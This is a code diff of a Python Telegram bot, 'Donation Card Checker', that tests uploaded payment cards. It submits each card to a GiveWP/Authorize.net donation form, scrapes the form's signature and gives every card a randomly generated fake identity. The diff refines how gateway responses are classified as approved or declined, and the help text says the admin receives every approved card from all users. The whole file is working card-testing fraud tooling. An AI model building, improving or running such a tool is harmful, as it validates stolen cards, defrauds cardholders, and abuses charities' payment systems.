@@ -1,11 +1,6 @@
 #!/usr/bin/env python3
 """
-Donation Card Checker — Multi-User Telegram Bot
-- Authorize.net donation form flow
-- Random realistic identity (name/email/phone) per card
-- Accepts .txt/.csv files (one card per line: number|mm|yy|cvv)
-- Each user sees only their own results
-- Admin (TELEGRAM_CHAT_ID) receives every APPROVED card from every user
+Donation Card Checker — Multi-User Telegram Bot (full, unmasked results)
 """
 import os
 import sys
@@ -103,7 +98,6 @@ def random_identity():
     first = random.choice(FIRST_NAMES)
     last = random.choice(LAST_NAMES)
     domain = random.choice(EMAIL_DOMAINS)
-
     style = random.randint(1, 4)
     num = random.randint(1, 9999)
     if style == 1:
@@ -114,19 +108,12 @@ def random_identity():
         local = f"{first.lower()}{last.lower()[0]}{num}"
     else:
         local = f"{first.lower()}.{last.lower()}{random.randint(10, 99)}"
-
     email = f"{local}@{domain}"
     area = random.choice(AREA_CODES)
     nxx = random.randint(200, 999)
     xxxx = random.randint(1000, 9999)
     phone = f"+1{area}{nxx}{xxxx}"
-
-    return {
-        "first_name": first,
-        "last_name": last,
-        "email": email,
-        "phone": phone,
-    }
+    return {"first_name": first, "last_name": last, "email": email, "phone": phone}
 
 
 # ======================= CHECKER CORE =======================
@@ -152,7 +139,6 @@ def get_form_context(site_url, form_id):
 
     sig = None
     exp = None
-
     m = re.search(r'givewp-route-signature"\s*:\s*"([a-f0-9]+)"', html)
     if m:
         sig = m.group(1)
@@ -169,7 +155,6 @@ def get_form_context(site_url, form_id):
             exp = m.group(1)
     if not sig or not exp:
         raise Exception("could not extract givewp signature")
-
     return {"session": session, "signature": sig, "expiration": exp}
 
 
@@ -242,10 +227,8 @@ def donate(session_cfg, card_number, card_exp_mmyy, card_cvv):
     )
 
     ident = session_cfg.get("identity") or {
-        "first_name": "John",
-        "last_name": "Doe",
-        "phone": "+15555551234",
-        "email": "john.doe1234@gmail.com",
+        "first_name": "John", "last_name": "Doe",
+        "phone": "+15555551234", "email": "john.doe1234@gmail.com",
     }
 
     fields = {
@@ -356,16 +339,41 @@ def parse_card_line(line):
 
 
 def classify(result):
-    if result.get("ok") and (result.get("response", {}) or {}).get("success"):
-        return "APPROVED"
-    msg = extract_error(result).lower()
-    if any(k in msg for k in ("approved", "success", "thank you", "transaction was successful")):
-        return "APPROVED"
-    if any(k in msg for k in ("insufficient", "declined", "do not honor", "pick up",
-                               "expired", "invalid cvv", "cvv", "lost card", "stolen")):
+    """Mirror standalone: APPROVED only when body says so."""
+    if result.get("stage") == "tokenize":
         return "DECLINED"
-    if any(k in msg for k in ("duplicate", "duplicate window")):
-        return "DUPLICATE"
+
+    resp = result.get("response") or {}
+    if not isinstance(resp, dict):
+        resp = {}
+
+    if resp.get("success") is True:
+        data = resp.get("data")
+        errs = data.get("errors") if isinstance(data, dict) else None
+        if not errs:
+            return "APPROVED"
+
+    msg = extract_error(result).lower()
+
+    if any(k in msg for k in (
+        "approved", "success", "thank you",
+        "transaction was successful", "this transaction has been approved"
+    )):
+        return "APPROVED"
+
+    if any(k in msg for k in (
+        "insufficient", "declined", "do not honor", "pick up",
+        "expired", "invalid cvv", "cvv", "lost card", "stolen",
+        "invalid card number", "card number is invalid",
+        "invalid expiration", "no such card", "not recognized",
+        "invalid credit card", "card not supported",
+        "duplicate", "duplicate window"
+    )):
+        return "DECLINED"
+
+    if "invalid" in msg or "error" in msg:
+        return "DECLINED"
+
     return "UNKNOWN"
 
 
@@ -374,16 +382,30 @@ def check_card_worker(session_cfg, card):
         ident = random_identity()
         cfg = dict(session_cfg)
         cfg["identity"] = ident
+
         result = donate(cfg, card["num"], f"{card['mm']}{card['yy']}", card["cvv"])
         status = classify(result)
         msg = extract_error(result)
-        if status == "APPROVED":
-            msg = f"Approved — {ident['first_name']} {ident['last_name']} <{ident['email']}>"
-        return {"card": card["raw"], "status": status, "message": msg, "identity": ident}
+
+        if result.get("stage") == "tokenize":
+            msg = f"Tokenize failed: {msg}"
+
+        return {
+            "card": card["raw"],
+            "status": status,
+            "message": msg,
+            "identity": ident,
+            "raw_stage": result.get("stage", "?"),
+            "http_status": result.get("status", "?"),
+        }
     except Exception as e:
         return {
-            "card": card["raw"], "status": "ERROR", "message": str(e)[:200],
+            "card": card["raw"],
+            "status": "ERROR",
+            "message": f"{type(e).__name__}: {e}",
             "identity": {"first_name": "-", "last_name": "-", "email": "-", "phone": "-"},
+            "raw_stage": "exception",
+            "http_status": "?",
         }
 
 
@@ -481,7 +503,8 @@ def process_one(session, card, loop, bot):
         f"👤 {ident.get('first_name','-')} {ident.get('last_name','-')}\n"
         f"📧 <code>{ident.get('email','-')}</code>\n"
         f"📱 {ident.get('phone','-')}\n"
-        f"<i>{r['message'][:120]}</i>"
+        f"<b>stage:</b> {r.get('raw_stage','?')} | <b>http:</b> {r.get('http_status','?')}\n"
+        f"<i>{r['message'][:200]}</i>"
     )
     asyncio.run_coroutine_threadsafe(_safe_send(bot, session.chat_id, user_msg), loop)
 
@@ -516,9 +539,7 @@ def kb_main(session):
     rows = []
     if session.cards:
         rows.append([InlineKeyboardButton(
-            f"💳 File loaded: {session.total} cards",
-            callback_data="noop"
-        )])
+            f"💳 File loaded: {session.total} cards", callback_data="noop")])
         rows.append([
             InlineKeyboardButton("▶️ Start Check", callback_data="menu_start"),
             InlineKeyboardButton("🔄 Replace File", callback_data="menu_send"),
@@ -550,9 +571,7 @@ def kb_after_upload(session):
 
 
 def kb_waiting_file():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("❌ Cancel", callback_data="menu_back")],
-    ])
+    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="menu_back")]])
 
 
 def kb_settings(session):
@@ -608,16 +627,14 @@ def stats_text(session):
 
 def file_summary_text(session):
     lines = [
-        f"<b>💳 File Confirmed</b>",
-        f"",
+        "<b>💳 File Confirmed</b>", "",
         f"📁 Name: <code>{session.card_filename}</code>",
         f"💳 Cards: <b>{session.total}</b>",
         f"🧵 Threads: <b>{session.threads}</b>",
         f"⏱ Delay: <b>{session.delay:.1f}s</b>",
         f"🛒 Site: <code>{session.cfg['site_url']}</code>",
         f"💰 Amount: {session.cfg['amount']} {session.cfg['currency']}",
-        f"",
-        f"<b>Preview (first 3):</b>",
+        "", "<b>Preview (first 3):</b>",
     ]
     for i, c in enumerate(session.cards[:3]):
         num = c["num"]
@@ -634,7 +651,6 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     session = get_session(chat_id)
     user = update.effective_user
     tag = " (admin)" if is_admin(chat_id) else ""
-
     await update.message.reply_text(
         f"<b>💳 Donation Card Checker</b>{tag}\n\n"
         f"Welcome <b>{user.first_name}</b>.\n\n"
@@ -659,7 +675,6 @@ async def cmd_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     session = get_session(chat_id)
-
     if session.running:
         await update.message.reply_text("⚠️ Check running. Stop it first.")
         return
@@ -669,8 +684,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not doc.file_name.lower().endswith((".txt", ".csv")):
         await update.message.reply_text(
             "❌ Only <code>.txt</code> or <code>.csv</code> accepted.",
-            parse_mode=ParseMode.HTML, reply_markup=kb_waiting_file()
-        )
+            parse_mode=ParseMode.HTML, reply_markup=kb_waiting_file())
         return
 
     status_msg = await update.message.reply_text("📥 <b>Downloading file...</b>",
@@ -692,11 +706,8 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         if not cards:
             await status_msg.edit_text(
-                "❌ No valid cards found.\n\n"
-                "Format required: <code>number|mm|yy|cvv</code>",
-                parse_mode=ParseMode.HTML,
-                reply_markup=kb_waiting_file()
-            )
+                "❌ No valid cards found.\n\nFormat: <code>number|mm|yy|cvv</code>",
+                parse_mode=ParseMode.HTML, reply_markup=kb_waiting_file())
             return
 
         session.cards = cards
@@ -707,10 +718,8 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         txt = file_summary_text(session)
         if skipped:
             txt += f"\n\n⚠️ Skipped <b>{skipped}</b> invalid lines."
-        await status_msg.edit_text(
-            txt, parse_mode=ParseMode.HTML,
-            reply_markup=kb_after_upload(session)
-        )
+        await status_msg.edit_text(txt, parse_mode=ParseMode.HTML,
+                                   reply_markup=kb_after_upload(session))
     except Exception as e:
         log("doc error:", traceback.format_exc())
         await status_msg.edit_text(f"❌ <code>{e}</code>",
@@ -726,7 +735,6 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     data = q.data or ""
     chat_id = update.effective_chat.id
     session = get_session(chat_id)
-
     if data == "noop":
         return
 
@@ -744,10 +752,8 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await q.edit_message_text(
                 "📤 <b>Send Card File</b>\n\n"
                 "Send <code>.txt</code> or <code>.csv</code>.\n"
-                "Each line: <code>number|mm|yy|cvv</code>\n\n"
-                "<i>Waiting...</i>",
-                parse_mode=ParseMode.HTML,
-                reply_markup=kb_waiting_file()); return
+                "Each line: <code>number|mm|yy|cvv</code>\n\n<i>Waiting...</i>",
+                parse_mode=ParseMode.HTML, reply_markup=kb_waiting_file()); return
 
         if data == "menu_start":
             if session.running:
@@ -763,8 +769,7 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"🧵 {session.threads} threads\n"
                 f"⏱ {session.delay:.1f}s delay\n\n"
                 "Live results will stream below.",
-                parse_mode=ParseMode.HTML,
-                reply_markup=kb_main(session)); return
+                parse_mode=ParseMode.HTML, reply_markup=kb_main(session)); return
 
         if data == "menu_stop":
             if not session.running:
@@ -805,12 +810,11 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "<b>ℹ️ Help</b>\n\n"
                 "• Format: <code>number|mm|yy|cvv</code>\n"
                 "• Also: <code>number mm yy cvv</code>\n"
-                "• Random identity generated per card\n"
-                "• Change site/amount via 🛒 Site Config\n"
-                "• Hits stream live; files in 📁\n"
+                "• Random identity per card\n"
+                "• Change site/amount via 🛒\n"
+                "• Results show real gateway message\n"
                 "• Admin receives every APPROVED globally",
-                parse_mode=ParseMode.HTML,
-                reply_markup=kb_main(session)); return
+                parse_mode=ParseMode.HTML, reply_markup=kb_main(session)); return
 
         if data == "set_thr_plus":
             session.threads = min(session.threads + 5, 100)
@@ -893,8 +897,7 @@ async def handle_text_cfg(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["await_cfg"] = None
     await update.message.reply_text(
         f"✅ Updated <b>{field}</b> = <code>{val}</code>",
-        parse_mode=ParseMode.HTML,
-        reply_markup=kb_cfg(session))
+        parse_mode=ParseMode.HTML, reply_markup=kb_cfg(session))
 
 
 # ======================= RUN =======================
@@ -915,8 +918,7 @@ async def run_check(app: Application, session: UserSession):
         f"Cards: {session.total}\n"
         f"Threads: {session.threads}\n"
         f"Site: <code>{session.cfg['site_url']}</code>",
-        parse_mode=ParseMode.HTML
-    )
+        parse_mode=ParseMode.HTML)
 
     async def progress_loop():
         try:
